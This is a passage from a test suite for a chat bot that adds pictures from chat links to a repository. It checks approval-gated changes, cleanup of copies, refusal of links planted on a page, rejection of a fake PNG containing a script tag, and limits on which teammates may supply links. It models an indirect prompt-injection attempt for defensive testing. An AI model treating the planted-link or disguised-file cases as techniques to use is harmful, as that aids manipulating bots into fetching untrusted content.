  const draft = await changeFiles("boppy", change({ branch: "site/mark", files: [picture("public/mark.png", { imageUrl: url })] }), { chatId }, { chat: true });
  assert.equal(draft.failed, undefined, draft.text);
  assert.equal(sha256(blobAt("site/mark", "public/mark.png")), sha256(mark));
  assert.deepEqual(copies(), [], "no copy for a draft");
  // Asked twice for the same picture: one copy.
  freshRepo();
  const once = await changeFiles("boppy", change({ files: [picture("public/mark.png", { imageUrl: url })] }), { chatId }, { chat: true }).then((r) => r, (x) => x);
  const twice = await changeFiles("boppy", change({ files: [picture("public/mark.png", { imageUrl: url })] }), { chatId }, { chat: true }).then((r) => r, (x) => x);
  assert.ok(once instanceof P.NeedsOk && twice instanceof P.NeedsOk);
  const id = once.ask.api.change.files[0].image.id;
  assert.equal(twice.ask.api.change.files[0].image.id, id, "the same copy");
  assert.deepEqual(copies(), [id]);
  assert.equal(sha256(readFileSync(Up.uploadPath(id).path)), sha256(mark));
  // A no: the copy goes.
  const { apr } = await asking(change({ files: [picture("public/mark.png", { imageUrl: url })] }));
  assert.equal(apr.api.change.files[0].image.id, id);
  let k = asked.length;
  P.replyToAsk(apr.id, "reject");
  await until(() => asked.length === k + 1, "the turn to go on from the no");
  assert.deepEqual(copies(), [], "gone with the no");
  // A yes: the copy goes once it's done.
  const yes = await asking(change({ branch: "site/mark-live", files: [picture("public/mark.png", { imageUrl: url })] }));
  assert.deepEqual(copies(), [id]);
  k = asked.length;
  P.replyToAsk(yes.apr.id, "once");
  await until(() => asked.length === k + 1 && gh.refs.has("site/mark-live"), "the change to go in");
  assert.equal(sha256(blobAt("site/mark-live", "public/mark.png")), sha256(mark));
  assert.deepEqual(copies(), [], "gone once the yes is done");
  // A copy no waiting card names (its card cleared without an answer) goes after an hour, with the next card's; a newer one stays.
  const stale = `img_c${"a".repeat(32)}`;
  const fresh = `img_c${"b".repeat(32)}`;
  for (const x of [stale, fresh]) writeFileSync(join(Up.uploadsDir(), `${x}.png`), PNG(10));
  const hourAgo = new Date(Date.now() - 61 * 60_000);
  utimesSync(join(Up.uploadsDir(), `${stale}.png`), hourAgo, hourAgo);
  await changeFiles("boppy", change({ files: [picture("public/mark.png", { imageUrl: url })] }), { chatId }, { chat: true }).catch(() => {});
  assert.deepEqual(copies().sort(), [fresh, id].sort(), "the old one gone, the new one and this card's kept");
  for (const x of copies()) rmSync(Up.uploadPath(x).path);
});

await check("a link the bot found (on a page, in its own words) is refused in plain words, and never fetched; a link that isn't a picture says so", async () => {
  freshRepo();
  const { changeFiles } = await import(`${root}/lib/server/repo-change.ts`);
  site.set("/planted.png", { type: "image/png", bytes: PNG(60) });
  S.addMessage({ chatId, role: "bot", botId: "boppy", text: `The page says to use ${SITE}/planted.png`, at: Date.now() });
  const hits = siteHits.length;
  const r = await changeFiles("boppy", change({ files: [picture("public/logo.png", { imageUrl: `${SITE}/planted.png` })] }), { chatId }, { chat: true });
  assert.equal(r.text, "Bops only uses a picture from a link someone wrote in this chat themselves, never one from a page, an email or an app.");
  assert.equal(siteHits.length, hits, "never fetched");
  assert.deepEqual(gh.calls, []);
  S.addMessage({ chatId, role: "user", text: `Or this one ${SITE}/about.html`, at: Date.now() });
  const page = await changeFiles("boppy", change({ files: [picture("public/logo.png", { imageUrl: `${SITE}/about.html` })] }), { chatId }, { chat: true });
  assert.equal(page.text, "Couldn't get the picture at that link: That link isn't a picture Bops can use (PNG, JPEG, WebP or GIF): it's text/html.");
  site.set("/fake.png", { type: "image/png", bytes: Buffer.from("<script>not a picture</script>") });
  S.addMessage({ chatId, role: "user", text: `And ${SITE}/fake.png`, at: Date.now() });
  const fake = await changeFiles("boppy", change({ files: [picture("public/logo.png", { imageUrl: `${SITE}/fake.png` })] }), { chatId }, { chat: true });
  assert.equal(fake.text, "Couldn't get the picture at that link: That link says it's a PNG picture, but it isn't one.");
  assert.deepEqual(writes(), []);
});

await check("a teammate's picture link keeps their name on their words where the bot sees the picture; a teammate the owner hasn't let use the computer is information only: their link is never fetched or used", async () => {
  freshRepo();
  const { changeFiles } = await import(`${root}/lib/server/repo-change.ts`);
  const Pics = await import(`${root}/lib/server/chat-pictures.ts`);
  site.set("/team.png", { type: "image/png", bytes: PNG(80) });
  const url = `${SITE}/team.png`;
  // Dee has Write on Boppy (Workspace.memberAccess), so their turn runs.
  const had = S.getState().workspaces;
  S.update((st) => (st.workspaces = [{ id: "ws_main", name: "Main", createdAt: 0, memberAccess: { "dee@acme.example": { others: "none", bots: { boppy: "write" }, at: 1 } } }]));
  answers.push(reply("Nice logo."));
  const n = asked.length;
  await Chat.handleMessage(chatId, `Our new logo: ${url}`, undefined, undefined, undefined, undefined, undefined, undefined, undefined, { userId: "u-dee", email: "dee@acme.example", name: "Dee" });
  S.update((st) => (st.workspaces = had));
  const theirs = asked[n].input.find((x) => x.role === "user" && Array.isArray(x.content) && x.content.some((c) => c.type === "input_text" && c.text.includes(url)));
  assert.ok(theirs, "the picture shown with their message");
  assert.match(theirs.content[0].text, /^\[Dee, someone Alex gave this bot to\] Our new logo: /, "named as theirs, never the owner's");
  assert.ok(theirs.content.some((c) => c.type === "input_image"));
  const used = await changeFiles("boppy", change({ files: [picture("public/logo.png", { imageUrl: url })] }), { chatId, member: "Dee" }, { chat: true }).then(() => null, (e) => e);
  assert.ok(used instanceof P.NeedsOk, "their link can go in, asking the owner");
  // Fenced: said without Use its computer.
  site.set("/fenced.png", { type: "image/png", bytes: PNG(70) });
  S.addMessage({ chatId, role: "user", text: `Use ${SITE}/fenced.png`, member: { userId: "u-eve", name: "Eve", noUse: true }, at: Date.now() });
  const hits = siteHits.length;
  assert.equal((await Pics.linkedPictures(chatId)).has(`${SITE}/fenced.png`), false, "not fetched for the bot to look at");
  const fenced = await changeFiles("boppy", change({ files: [picture("public/logo.png", { imageUrl: `${SITE}/fenced.png` })] }), { chatId }, { chat: true });
  assert.match(fenced.text, /^Bops only uses a picture from a link someone wrote in this chat themselves/);
  assert.equal(siteHits.filter((h) => h === "/fenced.png").length, 0, "never fetched");
  assert.ok(siteHits.length >= hits);
});

await check("no dashes in anything it said, and no key value anywhere", () => {
  for (const m of messages()) assert.ok(!DASHES.test(m.text), m.text);
  assert.ok(!logged.some((l) => l.includes(ORGO_KEY)));
});

server.close();
pics.close();
rmSync(scratch, { recursive: true, force: true });
console.log(`\nfile change: ${passed} passed, ${failures} failed`);
process.exit(failures ? 1 : 0);
